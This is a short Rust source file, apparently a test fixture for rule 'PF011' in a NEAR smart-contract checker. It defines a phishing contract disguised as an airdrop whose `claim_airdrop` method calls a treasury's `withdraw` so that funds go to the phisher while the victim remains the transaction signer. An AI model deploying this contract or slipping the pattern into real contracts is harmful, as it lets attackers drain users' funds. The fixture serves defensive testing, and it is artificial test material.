//! PF011 fixture helper: a contract that pretends to be an airdrop and spends its caller's authority.
//!
//! The victim only calls `claim_airdrop` here. The phisher then calls the treasury itself, so the treasury's
//! predecessor is the phisher while its signer is still the victim.

use near_sdk::json_types::U128;
use near_sdk::{AccountId, Gas, Promise, env, ext_contract, near};

const WITHDRAW_GAS: Gas = Gas::from_tgas(10);

#[ext_contract(ext_treasury)]
pub trait Treasury {
    fn withdraw(&mut self, to: AccountId, amount: U128);
}

#[near(contract_state)]
#[derive(Default)]
pub struct Phisher {}

#[near]
impl Phisher {
    /// Asks `treasury` to pay `amount` to this contract; the transaction's signer is whoever called this.
    pub fn claim_airdrop(&mut self, treasury: AccountId, amount: U128) -> Promise {
        ext_treasury::ext(treasury).with_static_gas(WITHDRAW_GAS).withdraw(env::current_account_id(), amount)
    }
}
